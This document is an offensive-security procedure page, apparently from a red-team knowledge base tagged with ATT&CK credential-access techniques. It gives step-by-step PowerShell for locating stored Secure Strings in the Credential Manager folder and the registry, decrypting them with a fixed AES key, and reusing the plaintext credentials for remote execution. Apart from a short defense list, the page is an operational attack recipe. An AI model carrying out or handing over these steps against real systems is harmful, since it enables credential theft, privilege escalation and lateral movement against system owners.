---
id: c946f6fa-d806-48f1-8beb-8c53e9fbd75e
name: Windows-Credentials-Decryption-using-PowerShell-Secure-String
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:31.188811+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credentials in Files|T1081 - Credentials in Files]]'
  - '[[techniques/Credentials in Registry|T1214 - Credentials in Registry]]'
sub_techniques: []
tags:
  - '[[tags/PowerShell-Remoting-Protocol]]'
  - '[[tags/PowerShell-Secure-String]]'
  - '[[tags/Windows-Using-Credentials]]'
commands: []
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Windows-Credentials-Decryption-using-PowerShell-Secure-String

## Summary

This procedure demonstrates how to decrypt stored Windows credentials encrypted as Secure Strings using PowerShell. It leverages the PowerShell Remoting Protocol to execute decryption scripts remotely on a compromised Windows system, allowing attackers to recover plaintext credentials from files or the registry for privilege escalation or lateral movement.

## Description

On Windows systems, credentials such as those for network shares, services, or applications may be stored in an encrypted form using PowerShell's Secure String feature, often in files (e.g., via Credential Manager) or the registry. This procedure uses the ConvertTo-SecureString cmdlet with a known AES encryption key to reconstruct the Secure String object from its encrypted representation, followed by marshaling to extract the plaintext. It is typically employed after initial access to a system, targeting locations like the Windows Credential Manager or custom-stored encrypted strings. The technique requires knowledge of the encryption key, which might be derived from system-specific data or default values. Success yields usernames and passwords usable for further attacks, but detection can occur through PowerShell logging.

## Requirements

1. Administrative or local access to the target Windows system with stored Secure Strings.
2. Knowledge of the AES key used for encryption (often 32 bytes for AES-256).
3. PowerShell execution privileges on the target (may require bypassing execution policies).
4. Optional: Remote access via PowerShell Remoting (WinRM enabled) for lateral execution.

## Defense

- Use stronger key management for credential encryption, avoiding static or predictable AES keys.
- Restrict access to credential storage locations like %APPDATA%\Microsoft\Credentials or HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Password.
- Enable PowerShell logging (Module, Script Block, and Transcription) to monitor Secure String operations.
- Implement application whitelisting to block unauthorized PowerShell scripts.

## Objectives

1. Recover plaintext credentials from encrypted Secure Strings stored on the system.
2. Enable privilege escalation or lateral movement using the decrypted credentials.
3. Maintain access by reusing credentials without triggering additional authentication.

## Instructions

### Step 1: Identify Stored Secure Strings

**Context**: Locate the encrypted Secure String data, typically in files or registry keys containing base64-encoded strings from credential storage.

Search common locations manually or via PowerShell:

```powershell
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Filter "*.cred"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name "Password"
```

> This step reveals files or registry values with encrypted strings like "76492d11167...".

### Step 2: Prepare the AES Key

**Context**: The AES key must match the one used during encryption. In many cases, it is a fixed 32-byte array derived from system or application defaults.

Define the key as a byte array in PowerShell:

```powershell
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
```

> Verify the key length is 32 bytes for AES-256 compatibility.

### Step 3: Decrypt the Secure String

**Context**: Use the prepared key to decrypt the Secure String and extract plaintext credentials. This step references the dedicated code snippet for the decryption logic.

Execute the decryption using [[codes/PowerShell-Decrypt-SecureString-with-AES-Key]]:

Embed the code directly or invoke it via a script:

```powershell
# Paste or dot-source the code here
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureString = "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA="  # Replace with actual encrypted string
$secureObject = ConvertTo-SecureString -String $secureString -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
Write-Output $decrypted
```

> Expected output is the plaintext credential, e.g., a username:password pair. If the key is incorrect, it may produce garbage or an error.

### Step 4: Verify and Use Credentials

**Context**: Test the decrypted credentials to ensure they are valid for intended actions like network access or privilege escalation.

Use the credentials in a test command:

```powershell
$cred = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString $decrypted -AsPlainText -Force))
Invoke-Command -ComputerName target-host -Credential $cred -ScriptBlock { whoami }
```

> Success is indicated by successful remote execution or authentication without errors.
